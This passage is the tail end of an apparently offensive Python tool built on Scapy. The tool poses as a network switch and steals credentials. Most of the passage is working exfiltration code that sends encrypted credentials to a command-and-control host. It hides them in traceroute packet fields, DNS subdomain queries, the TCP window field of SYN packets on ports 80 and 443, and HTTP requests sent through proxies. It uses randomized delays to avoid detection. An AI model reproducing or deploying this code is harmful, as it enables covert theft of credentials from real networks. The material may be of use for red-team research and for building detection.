                                pingpkt = pingpkt.__class__(str(pingpkt))
                                sendp(pingpkt, iface=iface, verbose=0)
                                # random delay
                                if not DEBUG:
                                    time.sleep(random.randint(1, 30))
                                else:
                                    time.sleep(1)

                        # Traceroute exfiltration
                        # Use [IP].id 200+len and [IP].id 300+amount of pkts
                        # To encapsulate crypto, split by 16bits and attach
                        # last 4 bytes of traceroute[UDP] Raw (@ABC.....)
                        if ETRACE:
                            if DEBUG:
                                print('Sending credentials via Traceroute')
                            # craft packet
                            trcpkt = (Ether(src=switchmac, dst=gwmac) /
                                      IP(ihl=5, src=ip, dst=cchost) /
                                      UDP(sport=53200, dport=33434) /
                                      Raw(load='@ABCDEFGHIJKLMNOP'
                                               'QRSTUVWXYZ[abcd'))

                            # first pkt (crypto len)
                            trcpkt[IP].ttl = 32
                            trcpkt[IP].id = 200 + len(cry)
                            trcpkt = trcpkt.__class__(str(trcpkt))
                            sendp(trcpkt, iface=iface, verbose=0)

                            # random delay
                            if not DEBUG:
                                time.sleep(random.randint(1, 30))
                            else:
                                time.sleep(1)

                            # second pkt (amount of pkts)
                            trcpkt[IP].id = 300 + len(ar)
                            del trcpkt[IP].chksum
                            del trcpkt[UDP].chksum
                            trcpkt = trcpkt.__class__(str(trcpkt))
                            sendp(trcpkt, iface=iface, verbose=0)

                            # random delay
                            if not DEBUG:
                                time.sleep(random.randint(1, 30))
                            else:
                                time.sleep(1)

                            # payload pkts
                            for x in range(len(ar)):
                                del trcpkt[IP].chksum
                                del trcpkt[UDP].chksum
                                trcpkt[IP].id = 500 + x
                                trcpkt[IP].ttl = 32 - x
                                trcpkt[UDP].dport = trcpkt[UDP].dport + x // 3
                                trcpkt[Raw].load = '@ABCDEFGHIJKLMNO'\
                                                   'PQRSTUVWXYZ[' + ar[x]
                                trcpkt = trcpkt.__class__(str(trcpkt))
                                sendp(trcpkt, iface=iface, verbose=0)
                                # random delay
                                if not DEBUG:
                                    time.sleep(random.randint(1, 30))
                                else:
                                    time.sleep(1)

                        # DNS exfiltration
                        # Within a DNS NS pkt, we set the crypto (all of it)
                        # as subdomain <crypto>.ccname
                        if EDNS:
                            if DEBUG:
                                print('Sending credentials via DNS')
                            # craft packet
                            dnspkt = (Ether(src=switchmac, dst=gwmac) /
                                      IP(ihl=5, src=ip, dst=dns_srv) /
                                      UDP(sport=53, dport=53) /
                                      DNS(rd=1,
                                          qd=DNSQR(
                                                   qname=cry+'.'+ccname,
                                                   qtype='NS')))

                            # one pkt (crypto)
                            dnspkt[IP].id = random.randint(0, 0xFFFF)
                            dnspkt[DNS].id = random.randint(0, 0xFFFF)
                            dnspkt = dnspkt.__class__(str(dnspkt))
                            sendp(dnspkt, iface=iface, verbose=0)

                        # HTTP exfiltration
                        # We don't neeed a fully TCP/3WAY, just a few SYN
                        # packets. As before, [IP].id used for crypto len &
                        # amount of pkt. The crypto payload split / 4
                        # (16bits each) hidden on [TCP].window field
                        if EWEB:
                            if DEBUG:
                                print('Sending credentials via HTTP')
                            # craft packet
                            httppkt = (Ether(src=switchmac, dst=gwmac) /
                                       IP(ihl=5,
                                          flags='DF',
                                          src=ip,
                                          dst=cchost) /
                                       TCP(sport=random.randint(3025, 38000),
                                           dport=80,
                                           ack=0,
                                           dataofs=10,
                                           reserved=0,
                                           flags='S',
                                           urgptr=0))
                            httppkt[TCP].options = [('MSS', 1460),
                                                    ('SAckOK', ''),
                                                    ('Timestamp',
                                                     (int(time.time()), 0)),
                                                    ('NOP', None),
                                                    ('WScale', 6)]
                            httppkt[TCP].seq = random.randint(1000000000,
                                                              1800000000)
                            httppkt[TCP].window = random.randint(30000, 40000)

                            # first pkt (crypto len)
                            httppkt[IP].id = 200 + len(cry)
                            httppkt = httppkt.__class__(str(httppkt))
                            sendp(httppkt, iface=iface, verbose=0)

                            # random delay
                            if not DEBUG:
                                time.sleep(random.randint(1, 30))
                            else:
                                time.sleep(1)

                            # second pkt (amount of pkts)
                            del httppkt[IP].chksum
                            del httppkt[TCP].chksum
                            httppkt[IP].id = 300 + len(ar)
                            httppkt = httppkt.__class__(str(httppkt))
                            sendp(httppkt, iface=iface, verbose=0)

                            # random delay
                            if not DEBUG:
                                time.sleep(random.randint(1, 30))
                            else:
                                time.sleep(1)

                            # payload pkts
                            for x in range(len(ar)):
                                del httppkt[IP].chksum
                                del httppkt[TCP].chksum
                                httppkt[IP].id = 500 + x
                                httppkt[TCP].window = int(ar[x], 16)
                                httppkt = httppkt.__class__(str(httppkt))
                                sendp(httppkt, iface=iface, verbose=0)
                                # random delay
                                if not DEBUG:
                                    time.sleep(random.randint(1, 30))
                                else:
                                    time.sleep(1)

                        # HTTPS/SSL exfiltration
                        # We don't neeed a fully TCP/3WAY, just a few SYN
                        # packets. As before, [IP].id used for crypto len &
                        # amount of pkt. The crypto payload split / 4
                        # (16bits each) hidden on [TCP].window field
                        if ESSL:
                            if DEBUG:
                                print('Sending credentials via HTTPS')
                            # craft packet
                            httpspkt = (Ether(src=switchmac, dst=gwmac) /
                                        IP(ihl=5,
                                           flags='DF',
                                           src=ip,
                                           dst=cchost) /
                                        TCP(sport=random.randint(3025, 38000),
                                            dport=443,
                                            ack=0,
                                            dataofs=10,
                                            reserved=0,
                                            flags='S',
                                            urgptr=0))
                            httpspkt[TCP].options = [('MSS', 1460),
                                                     ('SAckOK', ''),
                                                     ('Timestamp',
                                                      (int(time.time()), 0)),
                                                     ('NOP', None),
                                                     ('WScale', 6)]
                            httpspkt[TCP].seq = random.randint(1000000000,
                                                               1800000000)
                            httpspkt[TCP].window = random.randint(30000, 40000)

                            # first pkt (crypto len)
                            httpspkt[IP].id = 200 + len(cry)
                            httpspkt = httpspkt.__class__(str(httpspkt))
                            sendp(httpspkt, iface=iface, verbose=0)

                            # random delay
                            if not DEBUG:
                                time.sleep(random.randint(1, 30))
                            else:
                                time.sleep(1)

                            # second pkt (amount of pkts)
                            del httpspkt[IP].chksum
                            del httpspkt[TCP].chksum
                            httpspkt[IP].id = 300 + len(ar)
                            httpspkt = httpspkt.__class__(str(httpspkt))
                            sendp(httpspkt, iface=iface, verbose=0)

                            # random delay
                            if not DEBUG:
                                time.sleep(random.randint(1, 30))
                            else:
                                time.sleep(1)

                            # payload pkts
                            for x in range(len(ar)):
                                del httpspkt[IP].chksum
                                del httpspkt[TCP].chksum
                                httpspkt[IP].id = 500 + x
                                httpspkt[TCP].window = int(ar[x], 16)
                                httpspkt = httpspkt.__class__(str(httpspkt))
                                sendp(httpspkt, iface=iface, verbose=0)
                                # random delay
                                if not DEBUG:
                                    time.sleep(random.randint(1, 30))
                                else:
                                    time.sleep(1)

                        if EPRX:
                            if prxlist:
                                if DEBUG:
                                    print('Sending credentials via Proxy: ' + ' '.join(prxlist))
                            # setup proxy and send HTTPS (DNS crypto)
                                headers = {
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv11.0) like Gecko',
                                        'Accept-Enconding': ', '.join(('gzip', 'deflate')),
                                        'Accept': '*/*',
                                        'Connection': 'keep-alive'
                                }
                                fakeurl = 'http://' + cry + '.' + ccname
                                for prx in range(len(prxlist)):
                                    http_proxy = 'http://' + prxlist[prx]
                                    proxyDict = {
                                                'http': http_proxy,
                                                'https': http_proxy
                                                }
                                    try:
                                        r = requests.get(fakeurl, headers=headers, proxies=proxyDict)
                                    except requests.exceptions.RequestException:
                                        pass 
                                    if not DEBUG:
                                        time.sleep(random.randint(1, 30))
                                    else:
                                        time.sleep(1)

                # Define interval between exfiltration (per line of cred file)
                if DEBUG:
                    print('Credentials by line 300sec interval (20s verbose)')
                    time.sleep(20)
                else:
                    time.sleep(300)

        # Capture ctrl+c for clean exit
        except KeyboardInterrupt:
            kill_process('sshd-fake')
            kill_process('telnetd-fake')
            kill_process('snmposter')
            cdpdh.join()
            lldpdh.join()
            try:
                aphd.join()
            except NameError:
                pass
            sys.exit(0)


# Call main
if __name__ == '__main__':
    main()
